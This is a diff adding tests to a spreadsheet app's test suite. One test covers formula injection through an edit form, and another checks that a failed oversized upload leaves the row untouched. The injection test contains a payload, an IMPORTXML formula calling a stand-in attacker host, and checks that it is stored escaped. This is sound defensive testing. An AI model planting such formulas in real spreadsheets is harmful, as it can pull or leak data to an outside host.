@@ -1364,6 +1364,39 @@ G.uiUpdateEntry('iva', deferred.row, { values: { 'Notes': 'edited again' } });
 check('editing again sends nothing further', mocks.MailApp.sent.length === mailAfter,
   mocks.MailApp.sent.length - mailAfter);
 
+// The edit path writes through writeCell, which escapes - but that is a
+// property of writeCell rather than of this code, so it is worth pinning here
+// too. createEntry has its own version of this test.
+section('a formula typed into the edit form is stored as text');
+G.uiUpdateEntry('work', edited.row, {
+  values: { 'Counterparty': '=IMPORTXML("http://evil.test","//x")' }
+});
+check('stored escaped, never evaluated',
+  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Counterparty'])
+    .getValue().toString().indexOf("'=") === 0,
+  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Counterparty']).getValue());
+G.uiUpdateEntry('work', edited.row, { values: { 'Counterparty': 'Fixed Ltd' } });
+
+// A failed upload must change nothing at all, rather than applying the field
+// edits and leaving the document missing.
+section('a failed upload during an edit leaves the row untouched');
+const beforeEdit = G.uiEntry('work', edited.row).cells['Notes'];
+const liveBeforeEdit = Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
+let editUploadFailed = null;
+try {
+  G.uiUpdateEntry('work', edited.row, {
+    values: { 'Notes': 'should not survive' },
+    files: [{ header: 'Receipt URL', name: 'big.pdf', mimeType: 'application/pdf',
+              data: 'x'.repeat(20 * 1024 * 1024) }]
+  });
+} catch (e) { editUploadFailed = e.message; }
+check('refused', /too large/.test(editUploadFailed || ''), editUploadFailed);
+check('and the field edit was not applied either',
+  G.uiEntry('work', edited.row).cells['Notes'] === beforeEdit,
+  G.uiEntry('work', edited.row).cells['Notes']);
+check('and nothing was added to Drive',
+  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length === liveBeforeEdit);
+
 section('replacing a document does not strand the old one');
 const oldFileId = G.extractFileId(
   mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Receipt URL']).getValue());
